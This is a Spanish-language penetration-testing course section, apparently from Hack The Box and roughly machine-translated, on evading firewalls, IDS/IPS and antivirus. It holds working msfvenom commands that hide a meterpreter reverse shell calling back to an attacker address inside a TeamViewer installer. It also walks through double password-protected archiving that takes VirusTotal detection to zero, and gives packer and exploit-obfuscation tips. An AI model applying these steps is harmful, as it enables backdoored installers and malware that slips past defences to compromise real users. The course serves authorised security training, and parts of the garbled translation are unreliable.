# Firewall e IDS/IPS evasión

Para aprender mejor cómo podemos atacar de manera eficiente y silenciosa un objetivo, primero debemos entender mejor cómo se defiende ese objetivo. Nos presentan dos nuevos términos:

- Protección del punto final
- Protección perimetral

---

# **Protección del punto final**

`Endpoint protection`se refiere a cualquier dispositivo o servicio localizado cuyo único propósito es proteger un solo host en la red. El host puede ser una computadora personal, una estación de trabajo corporativa o un servidor en la zona desilitarizada de una red (`DMZ`).

La protección del punto final generalmente viene en forma de paquetes de software que incluyen`Antivirus Protection`, `Antimalware Protection`(Esto incluye bloatware, spyware, adware, sharware, ransomware),`Firewall`, y`Anti-DDOS`Todo en uno, bajo el mismo paquete de software. Estamos mejor familiarizados con este formulario que este último, ya que la mayoría de nosotros estamos ejecutando un software de protección de punto final en nuestras PC en el hogar o las estaciones de trabajo en nuestro lugar de trabajo. Avast, Nod32, MalwareBytes y Bitdefender son solo algunos nombres actuales.

---

### **Protección perimetral**

`Perimeter protection`Por lo general, viene en dispositivos físicos o virtualizados en el borde del perímetro de red. Estos`edge devices`ellos mismos proporcionan acceso`inside`de la red de la`outside`, en otros términos, de`public`a`private`.

Entre estas dos zonas, en algunas ocasiones, también encontraremos una tercera, llamada zona des-militarizada (`DMZ`), que se mencionó anteriormente. Este es un`lower-security policy level`zona que la`inside networks'`uno, pero con un mayor`trust level`que el`outside zone`, que es el vasto Internet. Este es el espacio virtual donde se alojan los servidores públicos, que empujan y extraen datos para clientes públicos de Internet, pero también se gestionan desde adentro y se actualizan con parches, información y otros datos para mantener actualizado la información atendida y satisfacer a los clientes de los servidores.

---

# **Políticas de seguridad**

Las políticas de seguridad son el impulso detrás de cada postura de seguridad bien mantenida de cualquier red. Funcionan de la misma manera que la ACL (listas de control de acceso) para cualquier persona familiarizada con el material educativo de Cisco CCNA. Son esencialmente una lista de`allow`y`deny`declaraciones que dictan cómo el tráfico o los archivos pueden existir dentro de un límite de red. Múltiples listas pueden actuar sobre múltiples piezas de red, lo que permite flexibilidad dentro de una configuración. Estas listas también pueden orientar diferentes características de la red y los hosts, dependiendo de dónde residan:

- Políticas de tráfico de red
- Políticas de aplicación
- Políticas de control de acceso a los usuarios
- Políticas de gestión de archivos
- Políticas de protección DDoS
- Otros

Si bien no todas estas categorías anteriores pueden tener las palabras "Política de seguridad" adjuntas a ellas, todos los mecanismos de seguridad a su alrededor operan con el mismo principio básico, el`allow`y`deny`entradas. La única diferencia es el objetivo del objeto al que se refieren y se aplican. Entonces, la pregunta sigue siendo, ¿cómo combinamos los eventos en la red con estas reglas para que se puedan tomar las acciones mencionadas anteriormente?

Hay múltiples formas de hacer coincidir un evento u objeto con una entrada de política de seguridad:

| **Política de seguridad** | **Descripción** |
| --- | --- |
| `Signature-based Detection` | El funcionamiento de los paquetes en la red y la comparación con los patrones de ataque prefabricados y preordenados conocidos como firmas. Cualquier coincidencia del 100% contra estas firmas generará alarmas. |
| `Heuristic / Statistical Anomaly Detection` | La comparación conductual con una línea de base establecida incluyó firmas modus-operandi para APT conocidos (amenazas persistentes avanzadas). La línea de base identificará la norma para la red y qué protocolos se usan comúnmente. Cualquier desviación del umbral máximo generará alarmas. |
| `Stateful Protocol Analysis Detection` | Reconociendo la divergencia de los protocolos establecidos por comparación de eventos utilizando perfiles preconstruidos de definiciones generalmente aceptadas de actividad no maliciosa. |
| `Live-monitoring and Alerting (SOC-based)` | Un equipo de analistas en un SOC dedicado, interno o arrendado (Centro de Operaciones de Seguridad) utiliza software de alimentación en vivo para monitorear la actividad de la red y los sistemas alarmantes intermedios para cualquier amenaza potencial, ya sea decidir a sí mismos si la amenaza debe ser actuada o si los mecanismos automatizados toman medidas en su lugar. |

---

# **Técnicas de evasión**

La mayoría del software antivirus basado en host hoy en día se basa principalmente en`Signature-based Detection`para identificar aspectos del código malicioso presente en una muestra de software. Estas firmas se colocan dentro del motor antivirus, donde posteriormente se utilizan para escanear el espacio de almacenamiento y los procesos de ejecución para cualquier coincidencia. Cuando un software desconocido aterriza en una partición y se corresponde con el software antivirus, la mayoría de los antivirus contienen el programa malicioso y matan el proceso de ejecución.

¿Cómo eludimos todo este calor? Jugamos junto con eso. Los ejemplos que se muestran en el`Encoders`La sección muestra que simplemente codificar cargas útiles que usan diferentes esquemas de codificación con múltiples iteraciones no es suficiente para todos los productos AV. Además, simplemente establecer un canal de comunicación entre el atacante y la víctima puede generar algunas alarmas con las capacidades actuales de los productos IDS/IPS.

Sin embargo, con el lanzamiento de MSF6, MSFConsole puede hacer un túnel la comunicación encriptada por AES de cualquier Shell de Meterpreter al host del atacante, cifrando con éxito el tráfico a medida que la carga útil se envía al host de la víctima. Esto se encarga principalmente de los ID/IP basados en la red. En algunos casos raros, podríamos reunirse con conjuntos de reglas de tráfico muy estrictos que marcan nuestra conexión en función de la dirección IP del remitente. La única forma de eludir esto es encontrar los servicios que se dejan pasar. Un excelente ejemplo de esto sería el hack de Equifax de 2017, donde los piratas informáticos maliciosos han abusado de la vulnerabilidad de Apache Struts para acceder a una red de servidores de datos críticos. Las técnicas de exfiltración de DNS se utilizaron para desviar los datos lentamente fuera de la red y en el dominio de los piratas informáticos sin ser notados durante meses. Para obtener más información sobre este ataque, visite los enlaces a continuación:

- [Informe post mortem del gobierno de los Estados Unidos sobre el hack de Equifax](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Protección de la exfiltración DNS](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Detener los datos exfil y malware se extiende a través de DNS](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

Volviendo a MSFConsole, su capacidad de mantener ahora los túneles encriptados por AES, junto con la característica de Meterpreter de correr en la memoria, aumenta nuestra capacidad por un margen. Sin embargo, todavía tenemos el problema de lo que sucede con una carga útil una vez que llega a su destino, antes de que se ejecute y coloque en la memoria. Este archivo podría ser realizado por su firma, coincidir con la base de datos y bloqueado, junto con nuestras posibilidades de acceder al objetivo. También podemos estar seguros de que los desarrolladores de software AV están buscando módulos y capacidades MSFConsole para agregar el código y los archivos resultantes a su base de datos de firma, lo que resulta en la mayoría, si no todas las cargas predeterminadas, el software AV apunta de inmediato hoy en día.

Estamos de suerte porque`msfvenom`Ofrece la opción de usar plantillas ejecutables. Esto nos permite usar algunas plantillas preestablecidas para archivos ejecutables, inyectarles nuestra carga útil (sin juego de palabras) y usar`any`ejecutable como una plataforma desde la cual podemos lanzar nuestro ataque. Podemos incrustar el shellcode en cualquier instalador, paquete o programa que tenemos a mano, ocultando el código de shell de la carga útil dentro del código legítimo del producto real. Esto ofusca enormemente nuestro código malicioso y, lo que es más importante, reduce nuestras posibilidades de detección. Existen muchas combinaciones válidas entre archivos ejecutables reales y legítimos, nuestros diferentes esquemas de codificación (y sus iteraciones) y nuestras diferentes variantes de shellcode de carga útil. Esto genera lo que se llama ejecutable trasero.

Eche un vistazo al fragmento a continuación para comprender cómo MSFVENOM puede incrustar las cargas útiles en cualquier archivo ejecutable:

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe

```

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ lsPictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes

```

En su mayor parte, cuando un objetivo lanza un ejecutable trasero, no parece suceder nada, lo que puede generar sospechas en algunos casos. Para mejorar nuestras posibilidades, necesitamos activar la continuación de la ejecución normal de la aplicación lanzada mientras extraemos la carga útil en un hilo separado de la aplicación principal. Lo hacemos con el`-k`bandera como aparece arriba. Sin embargo, incluso con el`-k`Flager en funcionamiento, el objetivo solo notará la puerta trasera si inicia la plantilla ejecutable trasera desde un entorno CLI. Si lo hacen, una ventana separada aparecerá con la carga útil, que no cerrará hasta que terminemos de ejecutar la interacción de la sesión de carga útil en el objetivo.

---

# **Archivo**

Archivar una información como un archivo, carpeta, script, ejecutable, imagen o documento y colocar una contraseña en el archivo evita muchas firmas antivirus comunes hoy. Sin embargo, la desventaja de este proceso es que se plantearán como notificaciones en el tablero de alarma AV que no se pueden escanear debido a que se bloquean con una contraseña. Un administrador puede optar por inspeccionar manualmente estos archivos para determinar si son maliciosos o no.

### **Generación de carga útil**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js

```

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ cat test.js�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��

```

Si verificamos contra Virustotal para obtener una línea de base de detección de la carga útil que generamos, los resultados serán los siguientes.

### **Virusta**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ msf-virustotal -k <API key> -f test.js

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*]
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y

[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0                                                  20220509

```

Ahora, intente archivarlo dos veces, contraseña de ambos archivos en la creación y eliminar el`.rar`/`.zip`/`.7z`extensión de sus nombres. Para este propósito, podemos instalar el[Utilidad de rar](https://www.rarlab.com/download.htm)de Rarlabs, que funciona precisamente como Winrar en Windows.

### **Archivar la carga útil**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gzxnoxos@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rarxnoxos@htb[/htb]$ rar a ~/test.rar -p ~/test.jsEnter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK
Done

```

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ lstest.js   test.rar

```

### **Eliminar la extensión .rar**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ mv test.rar testxnoxos@htb[/htb]$ lstest   test.js

```

### **Archear la carga útil de nuevo**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ rar a test2.rar -p testEnter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK
Done

```

### **Eliminar la extensión .rar**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ mv test2.rar test2xnoxos@htb[/htb]$ lstest   test2   test.js

```

El archivo test2 es el archivo .rar final con la extensión (.rar) eliminada del nombre. Después de eso, podemos proceder a subirlo en Virustotal para otro cheque.

### **Virusta**

Firewall e IDS/IPS evasión

```
xnoxos@htb[/htb]$ msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509

```

Como podemos ver en lo anterior, esta es una excelente manera de transferir datos`to`y`from`el host de destino.

---

# **Empacadores**

El término`Packer`se refiere al resultado de un`executable compression`Proceso donde la carga útil está llena junto con un programa ejecutable y con el código de descompresión en un solo archivo. Cuando se ejecuta, el código de descompresión devuelve el ejecutable trasero a su estado original, lo que permite otra capa de protección contra mecanismos de escaneo de archivos en hosts de destino. Este proceso tiene lugar transparentemente para que el ejecutable comprimido se ejecute de la misma manera que el ejecutable original mientras conserva toda la funcionalidad original. Además, MSFVENOM proporciona la capacidad de comprimir y cambiar la estructura de archivos de un ejecutable trasero y cifrar la estructura del proceso subyacente.

Una lista de software Pople Packer:

|  |  |  |
| --- | --- | --- |
| [Upx empacador](https://upx.github.io/) | [El protector de enigma](https://enigmaprotector.com/) | [Mpaño](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) |
| Packer exe alternativo | Exeste de la salud | Morfina |
| MAULLAR | Temida |  |

Si queremos obtener más información sobre Packers, consulte el[Proyecto Polypack](https://jon.oberheide.org/files/woot09-polypack.pdf).

---

# **Codificación de explotación**

Al codificar nuestro exploit o portar uno preexistente al marco, es bueno asegurarse de que el código de exploit no sea fácilmente identificable por las medidas de seguridad implementadas en el sistema de destino.

Por ejemplo, un típico`Buffer Overflow`Exploit puede distinguirse fácilmente del tráfico regular que viaja sobre la red debido a sus patrones de búfer hexadecimales. Las ubicaciones de IDS / IPS pueden verificar el tráfico hacia la máquina de destino y notar patrones específicos de uso excesivo para explotar el código.

Al ensamblar nuestro código de exploit, la aleatorización puede ayudar a agregar alguna variación a esos patrones, lo que romperá las firmas de la base de datos IPS / IDS para buffers de exploit bien conocidos. Esto se puede hacer ingresando un`Offset`Cambie dentro del código para el módulo MSFConsole:

Código:rubí

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],

```

Además del código BOF, uno siempre debe evitar el uso de trineos nop obvios donde el shellcode debe aterrizar después de completar el desbordamiento. Tenga en cuenta que el propósito del código BOF es bloquear el servicio que se ejecuta en la máquina de destino, mientras que el SLED NOP es la memoria asignada donde se inserta nuestro código de shell (la carga útil). Las entidades IPS/IDS verifican regularmente ambos, por lo que es bueno probar nuestro código de explotación personalizado en un entorno Sandbox antes de implementarlo en la red del cliente. Por supuesto, solo podríamos tener una oportunidad para hacerlo correctamente durante una evaluación.

Para obtener más información sobre la codificación de exploit, recomendamos revisar el[Metasploit: la guía del probador de penetración](https://nostarch.com/metasploit)Libro de No Starch Press. Profunden en bastante detalle sobre la creación de nuestras exploits para el marco.

---

Los sistemas de prevención de intrusiones y los motores antivirus son las herramientas de defensor más comunes que pueden derribar un punto de apoyo inicial en el objetivo. Estos funcionan principalmente en firmas de todo el archivo malicioso o la etapa de stub.

---

# **Una nota sobre evasión**

Esta sección cubre la evasión a un alto nivel. Esté atento a los módulos posteriores que profundizarán en la teoría y el conocimiento práctico necesario para realizar la evasión de manera más efectiva. Vale la pena probar algunas de estas técnicas en máquinas HTB más antiguas o instalar una VM con versiones más antiguas de Windows Defender o motores AV gratuitos, y practicar habilidades de evasión. Este es un vasto tema que no se puede cubrir adecuadamente en una sola sección.